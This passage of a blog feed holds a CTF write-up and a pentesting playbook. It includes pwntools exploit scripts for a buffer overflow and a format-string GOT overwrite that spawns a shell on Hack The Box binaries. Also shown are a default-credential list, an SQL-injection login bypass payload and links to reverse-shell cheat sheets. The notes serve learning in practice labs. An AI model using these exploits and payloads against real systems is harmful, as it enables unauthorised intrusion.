<p>Knowing that the buffer has 180 chars, let’s suppose that will 200 chars will overflow it, let’s create a pattern of 200 chars:</p>

<p><code class="language-plaintext highlighter-rouge">pattern_create 200 bof.txt</code></p>

<p>and input it to the program:</p>

<p><code class="language-plaintext highlighter-rouge">r &lt; pattern.txt</code></p>

<p>When the program crashes, we’ll see the registers:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You know <span class="nb">who </span>are 0xDiablos: 
AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.

<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0xc9 
EBX: 0x76414158 <span class="o">(</span><span class="s1">'XAAv'</span><span class="o">)</span>
ECX: 0xf7fa09b4 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
EDX: 0x1 
ESI: 0xffffcf94 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd165 <span class="o">(</span><span class="s2">"/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln"</span><span class="o">)</span>
EDI: 0xf7ffcb80 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
EBP: 0x41594141 <span class="o">(</span><span class="s1">'AAYA'</span><span class="o">)</span>
ESP: 0xffffceb0 <span class="o">(</span><span class="s2">"ZAAxAAyA"</span><span class="o">)</span>
EIP: 0x41417741 <span class="o">(</span><span class="s1">'AwAA'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41417741
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffceb0 <span class="o">(</span><span class="s2">"ZAAxAAyA"</span><span class="o">)</span>
0004| 0xffffceb4 <span class="o">(</span><span class="s2">"AAyA"</span><span class="o">)</span>
0008| 0xffffceb8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7fbeb00 <span class="nt">--</span><span class="o">&gt;</span> 0xf7d8fcd4 <span class="o">(</span><span class="s2">"GCC_3.0"</span><span class="o">)</span>
0012| 0xffffcebc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8 
0016| 0xffffcec0 <span class="nt">--</span><span class="o">&gt;</span> 0xffffcee0 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
0020| 0xffffcec4 <span class="nt">--</span><span class="o">&gt;</span> 0xf7f9f000 <span class="nt">--</span><span class="o">&gt;</span> 0x229dac 
0024| 0xffffcec8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffd020 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffda40 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
0028| 0xffffcecc <span class="nt">--</span><span class="o">&gt;</span> 0xf7d96519 <span class="nt">--</span><span class="o">&gt;</span> 0x8310c483 
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
0x41417741 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>
<p>The interesting one is <code class="language-plaintext highlighter-rouge">EIP</code> as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.</p>

<p>Now, we can use <code class="language-plaintext highlighter-rouge">pattern_offset</code> to obtain exactly the number of characters to reach to Return address:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41417741
1094809409 found at offset: 188
</code></pre></div></div>

<p>Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.</p>

<h3 id="write-the-exploit">Write the exploit</h3>

<p>In the case I’m working on the exploit just need to call another function in the code. In order to so, I’ll use python <code class="language-plaintext highlighter-rouge">pwntools</code>: <a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a> which helps a lot on these kind of things.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="c1"># offset to reach right before return address's location
</span><span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">188</span>

<span class="c1"># craft exploit: offset + flag() + padding + parameter 1 + parameter 2
</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'flag'</span><span class="p">],</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x90909090</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0ded00d</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="n">exploit</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.</p>

<h3 id="obfusctaed-code-">Obfusctaed code <a name="obfuscated"></a></h3>

<p>Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:</p>

<p><code class="language-plaintext highlighter-rouge">3734203635203636203132322036352036382034382036352037342031</code>.</p>

<p>This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):</p>

<ul>
  <li>hex to decimal &gt; decimal to char &gt; decode all string in base64:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">def</span> <span class="nf">dec_to_chr</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)])</span>

<span class="n">base64text</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">base64text</span> <span class="o">=</span> <span class="n">base64text</span> <span class="o">+</span> <span class="n">dec_to_chr</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"3734203635203636203132322036352036382034382036352037342031"</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"</span><span class="p">))</span>
<span class="n">base64text</span> <span class="o">=</span> <span class="n">base64text</span> <span class="o">+</span> <span class="n">dec_to_chr</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"3635203631"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64text</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="err">$</span><span class="n">s</span><span class="o">=</span><span class="s">'77.74.
</span></code></pre></div></div>
<p>In this case, this looks like the begining of a script trying to connect to an IP address.</p>

<h3 id="string-format-vulnerability-">String format vulnerability <a name="string-format"></a></h3>

<p>Some pieces of unsecure code, will print whatever the user is coding, see:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%299s"</span><span class="p">,</span><span class="n">local_148</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="n">local_148</span><span class="p">);</span>
</code></pre></div></div>

<p>If we’re a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: <code class="language-plaintext highlighter-rouge">%p,%p,%p</code> will leak the first
three memory positions in the stack: <code class="language-plaintext highlighter-rouge">0x1,0x1,0x7ffff7d14a37</code></p>

<p>More info here: <a href="https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/">https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</a></p>

<p>More info about the possible formats: <a href="https://en.wikipedia.org/wiki/Printf_format_string">https://en.wikipedia.org/wiki/Printf_format_string</a></p>

<h3 id="security-flags-">Security flags <a name="flags"></a></h3>

<p>When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use <a href="https://github.com/slimm609/checksec.sh">checksec</a>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gal@gal-Modern-14-C12M:~/workspace/gal/blog<span class="nv">$ </span>checksec /usr/bin/ls
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/usr/bin/ls'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre></div></div>

<ul>
  <li>RELRO: If there’s no <code class="language-plaintext highlighter-rouge">RELRO</code> protection, it means that the Global Object Table (<code class="language-plaintext highlighter-rouge">GOT</code>) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes <code class="language-plaintext highlighter-rouge">puts</code>, will execute arbitrary code.</li>
  <li>Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.</li>
  <li>NX: No code execution from the stack</li>
  <li>PIE: executable is loaded at random address.</li>
</ul>

<p>More info: <a href="https://opensource.com/article/21/6/linux-checksec">https://opensource.com/article/21/6/linux-checksec</a></p>

<h3 id="aslr-address-space-layout-randomisation">ASLR: Address Space Layout Randomisation<a name="aslr"></a></h3>

<p>This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.</p>

<p>In order to check if a exploit is stable, you can enable this in gdb, to check if your compter offset works in all situations:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  aslr on
<span class="o">[</span>+] Enabling ASLR
gef➤  start
</code></pre></div></div>

<h3 id="one-gadget">One gadget<a name="one-gadget"></a></h3>

<p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>

<p><code class="language-plaintext highlighter-rouge">libc</code> library has some pieces of code that runs a piece of code similar to <code class="language-plaintext highlighter-rouge">execve('/bin/sh', NULL, NULL)</code> which will lead to remote code execution.</p>

<p>You can use the one gadget to know exactly the memory address you need to point to achive this RCE.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge<span class="nv">$ </span>one_gadget glibc/libc.so.6 
0x50a37 posix_spawn<span class="o">(</span>rsp+0x1c, <span class="s2">"/bin/sh"</span>, 0, rbp, rsp+0x60, environ<span class="o">)</span>
constraints:
  rsp &amp; 0xf <span class="o">==</span> 0
  rcx <span class="o">==</span> NULL
  rbp <span class="o">==</span> NULL <span class="o">||</span> <span class="o">(</span>u16<span class="o">)[</span>rbp] <span class="o">==</span> NULL

0xebcf1 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, r10, <span class="o">[</span>rbp-0x70]<span class="o">)</span>
constraints:
  address rbp-0x78 is writable
  <span class="o">[</span>r10] <span class="o">==</span> NULL <span class="o">||</span> r10 <span class="o">==</span> NULL
  <span class="o">[[</span>rbp-0x70]] <span class="o">==</span> NULL <span class="o">||</span> <span class="o">[</span>rbp-0x70] <span class="o">==</span> NULL

0xebcf5 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, r10, rdx<span class="o">)</span>
constraints:
  address rbp-0x78 is writable
  <span class="o">[</span>r10] <span class="o">==</span> NULL <span class="o">||</span> r10 <span class="o">==</span> NULL
  <span class="o">[</span>rdx] <span class="o">==</span> NULL <span class="o">||</span> rdx <span class="o">==</span> NULL

0xebcf8 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsi, rdx<span class="o">)</span>
constraints:
  address rbp-0x78 is writable
  <span class="o">[</span>rsi] <span class="o">==</span> NULL <span class="o">||</span> rsi <span class="o">==</span> NULL
  <span class="o">[</span>rdx] <span class="o">==</span> NULL <span class="o">||</span> rdx <span class="o">==</span> NULL
</code></pre></div></div>

<p>For every memory address, it also describe which value the register need to have in order to execute the RCE.</p>

<h3 id="overwrite-global-object-table-">Overwrite Global Object Table <a name="override-got"></a></h3>

<p>The global object table is used to dynamically resolve standard library functions (<code class="language-plaintext highlighter-rouge">scanf</code>, <code class="language-plaintext highlighter-rouge">printf</code>, etc…). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.</p>

<p>Below, you can find an example of how we can override the global object table using the one gadget tool:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./spooky_time'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./spooky_time'</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'scary!</span><span class="se">\n\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'%3$lx%51$lx'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'than </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1133111</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">5056</span>
<span class="n">libc_one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebcf5</span> <span class="c1"># libc.address + offset computed with one gadget tool
</span>
<span class="n">fmtstr_payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="p">:</span> <span class="n">libc_one_gadget</span><span class="p">})</span> <span class="c1"># we make the function puts point to a RCE
</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'time..</span><span class="se">\n\n</span><span class="s">'</span><span class="p">,</span> <span class="n">fmtstr_payload</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="reverse-engineering" /><summary type="html"><![CDATA[I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting interesting links</title><link href="https://www.agalera.eu/pentesting-resources/" rel="alternate" type="text/html" title="Pentesting interesting links" /><published>2022-12-25T00:00:00-06:00</published><updated>2022-12-25T00:00:00-06:00</updated><id>https://www.agalera.eu/pentesting-resources</id><content type="html" xml:base="https://www.agalera.eu/pentesting-resources/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the pentesting interesting links I found.</p>

<p><!--more--></p>

<h2 id="resources">Resources</h2>

<table>
  <tbody>
    <tr>
      <td>Name</td>
      <td>Description</td>
      <td>Link</td>
    </tr>
    <tr>
      <td>pentestbook.six2dez.com</td>
      <td>General guides on pentesting</td>
      <td><a href="https://pentestbook.six2dez.com/">https://pentestbook.six2dez.com/</a></td>
    </tr>
    <tr>
      <td>revshells</td>
      <td>List of reverse shells</td>
      <td><a href="https://www.revshells.com/">https://www.revshells.com/</a></td>
    </tr>
    <tr>
      <td>Hacktricks</td>
      <td>Useful for everything related with pentesting</td>
      <td><a href="https://book.hacktricks.xyz/welcome/readme">https://book.hacktricks.xyz/welcome/readme</a></td>
    </tr>
    <tr>
      <td>SecLists</td>
      <td>Wordlists and stuff</td>
      <td><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></td>
    </tr>
    <tr>
      <td>Reverse shells</td>
      <td>More reverse shells payloads</td>
      <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">swisskyrepo/PayloadsAllTheThings</a></td>
    </tr>
    <tr>
      <td>Pentestmonkey</td>
      <td>Another pentesting guide</td>
      <td><a href="https://pentestmonkey.net/">https://pentestmonkey.net/</a></td>
    </tr>
    <tr>
      <td>GTFOBins</td>
      <td>List of UNIX binaries that can be used to bypass local security restrictions</td>
      <td><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></td>
    </tr>
    <tr>
      <td>LOLbas</td>
      <td>Similar to GTFObins but for Windows</td>
      <td><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></td>
    </tr>
    <tr>
      <td>Red team notes</td>
      <td>Red team notes</td>
      <td><a href="https://www.ired.team/">https://www.ired.team/</a></td>
    </tr>
    <tr>
      <td>SQL injections</td>
      <td>SQL injections</td>
      <td><a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">SQL injection cheatsheet</a></td>
    </tr>
    <tr>
      <td>CVE mitre</td>
      <td>Search for CVEs</td>
      <td><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a></td>
    </tr>
    <tr>
      <td>Request repo</td>
      <td>Tool to receive HTTP request and display data</td>
      <td><a href="https://requestrepo.com/">https://requestrepo.com/</a></td>
    </tr>
    <tr>
      <td>CTF 101</td>
      <td>CTF theory</td>
      <td><a href="https://ctf101.org/">https://ctf101.org/</a></td>
    </tr>
    <tr>
      <td>Buffer overflow and shellcode</td>
      <td>Theory behind buffer overflow and shellcode injection</td>
      <td><a href="https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/">https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/</a></td>
    </tr>
  </tbody>
</table>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html"><![CDATA[I keep this page as a reference to the different pentesting links I have used while doing the capture the flag exercises in https://www.hackthebox.com/]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting playbook</title><link href="https://www.agalera.eu/pentesting-playbook/" rel="alternate" type="text/html" title="Pentesting playbook" /><published>2022-12-25T00:00:00-06:00</published><updated>2022-12-25T00:00:00-06:00</updated><id>https://www.agalera.eu/pentesting-playbook</id><content type="html" xml:base="https://www.agalera.eu/pentesting-playbook/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the steps I take to complete the challenges.</p>

<p><!--more--></p>

<p>While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order):</p>

<h2 id="table-of-contents">Table of contents</h2>
<ol>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#breaking-in">Breaking in</a>
    <ol>
      <li><a href="#anonymous-access">Poorly configured access</a></li>
      <li><a href="#brute-force-user">Brute force user/password</a></li>
      <li><a href="#sql-injection">SQL Injection</a></li>
      <li><a href="#ssti">Server-side template injection</a></li>
      <li><a href="#arbitrary-file-upload">Arbitrary file upload</a></li>
      <li><a href="#lfi">Local file inclusion</a></li>
      <li><a href="#rfi">Remote file inclusion</a></li>
      <li><a href="#reverse-shell">Reverse shell</a></li>
      <li><a href="#rogue">Rogue servers</a>
        <ol>
          <li><a href="#ntlm">NTLM</a></li>
          <li><a href="#log4j-shell">Log4JShell</a></li>
        </ol>
      </li>
      <li><a href="#search-vuln">Search for vulnerabilities</a></li>
      <li><a href="#xxe">XML eXternal Entities</a></li>
      <li><a href="#jwt-confussion">JWT Key Confussion</a></li>
      <li><a href="#xss">Cross-Site Scripting</a></li>
    </ol>
  </li>
  <li><a href="#foothold">Foothold, we are in</a>
    <ol>
      <li><a href="#list-users">List users/group</a></li>
      <li><a href="#search-keywords">Search keywords</a></li>
      <li><a href="#local-port-forwarding">Local port forwarding</a></li>
      <li><a href="#lateral-movement">Lateral movement</a></li>
      <li><a href="#ssh-keys">Search for SSH keys</a></li>
    </ol>
  </li>
  <li><a href="#privilege-escalation">Privilege escalation</a>
    <ol>
      <li><a href="#privilege-escalation-windows">Privilege escalation on Windows</a></li>
      <li><a href="#privilege-escalation-linux">Privilege escalation on Linux</a>
        <ol>
          <li><a href="#privilege-escalation-suid">Set owner User ID</a></li>
          <li><a href="#privilege-escalation-app">Abuse regular application</a></li>
        </ol>
      </li>
    </ol>
  </li>
</ol>

<h3 id="enumeration-">Enumeration <a name="enumeration"></a></h3>

<p>Using <code class="language-plaintext highlighter-rouge">nmap</code> the attacker needs to see what is open in the target machine. For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<p>At this stage, we’ll behave like a legitimate user, e.g.: perform regular searches, etc…</p>

<p>If you discover a website, it’s interesting to test the following enumeration techniques:</p>

<h4 id="directory-brute-force">Directory brute force</h4>

<p>This is a technique useful to detect available paths for a web application. Also known as dir busting.</p>

<p>The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.</p>

<p>The tools to perform this is <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<p>Another option is to use sitemap functionality of <code class="language-plaintext highlighter-rouge">burp</code> suite</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h4 id="sub-domain-brute-force">Sub-domain brute force</h4>

<p>This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use <code class="language-plaintext highlighter-rouge">gobuster</code> to perform this.</p>

<h3 id="breaking-in-">Breaking in <a name="breaking-in"></a></h3>

<p>This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to explot.</p>

<p>The attack vector is different to each machine, here you can find most common vector attacks:</p>

<h4 id="poorly-configured-access-">Poorly configured access <a name="anonymous-access"></a></h4>

<p>The user might have <code class="language-plaintext highlighter-rouge">ftp</code> or <code class="language-plaintext highlighter-rouge">tftp</code> or <code class="language-plaintext highlighter-rouge">smb</code> shares with anonymous access. It’s worth taking a look because those access might leak some valuable information. Additionally, you can also check <code class="language-plaintext highlighter-rouge">metasploit</code> to check for this kind of access.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h4 id="brute-force-user-password-">Brute force user password <a name="brute-force-user"></a></h4>

<p>If you discover a login page, why not trying some default user/password combinations?. One thing to try is to search for the version of the software and query google for the default user/password.</p>

<p>Try the following user/password combinations first:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password
</code></pre></div></div>

<p>Another option to try here is to try to brute force the user/password:</p>

<p>You can try a dictionary attack to bruce force user/password combinations.</p>

<p>You can use a tool like thc-hydra: <a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>. However, this will fail if there if there’s any kind of CSRF protection.</p>

<p>In order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:</p>

<p><a href="https://github.com/adriangalera/pydra/">https://github.com/adriangalera/pydra/</a></p>

<p>Take into account that if you know for sure the user, it will take much less time than having to guess both user and password.</p>

<h4 id="sql-injection-">SQL Injection <a name="sql-injection"></a></h4>

<p>Poorly programmed queries can be very dangerous and leads to escaping issues in the queries. If you see any indications of a query, try to use <code class="language-plaintext highlighter-rouge">sqlmap</code> to identify potential SQL injections or try some very basic ones.</p>

<p>If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.</p>

<p>A typical SQL query for a login page can look like this:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'admin'</span>
</code></pre></div></div>

<p>If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="o">#</span><span class="s1">' AND password = '</span><span class="n">kjdfjklsdf</span><span class="s1">'
</span></code></pre></div></div>

<p>Now the query becomes:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span>
</code></pre></div></div>

<p>therefore, the query is no longer checking for password and the login page is bypassed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin'#
password: admin123 (any password will do the trick)
</code></pre></div></div>

<p>You can find more SQL injections here: <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a></p>

<p>Pay attention when breaking the rest of the query with comments. The standard comment <code class="language-plaintext highlighter-rouge">--</code> might not always work, it’s worth trying another kind of comments like <code class="language-plaintext highlighter-rouge">#</code></p>

<h4 id="server-side-template-injection-">Server side template injection <a name="ssti"></a></h4>

<p>if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.</p>

<p>If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.</p>

<p>One easy way to test that is to put something like {{7*7}} in the template and check for the result.</p>

<p>If the template executes, we’ll see the result, out of luck we will see nothing. Or maybe we’ll see some trace that reveals the technology behind.</p>

<h4 id="arbitrary-file-upload-">Arbitrary file upload <a name="arbitrary-file-upload"></a></h4>

